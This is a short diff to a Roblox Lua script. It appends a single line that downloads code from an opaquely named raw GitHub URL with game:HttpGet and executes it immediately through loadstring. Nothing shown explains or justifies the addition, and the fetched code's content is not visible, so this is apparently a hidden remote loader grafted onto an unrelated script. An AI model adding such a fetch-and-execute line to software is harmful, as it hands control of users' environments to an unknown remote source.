@@ -228,3 +228,5 @@ spawn(function()
         end
     end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tewtiy551/tewwwwwwwwwwwwwwww/main/tewwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww", true))()
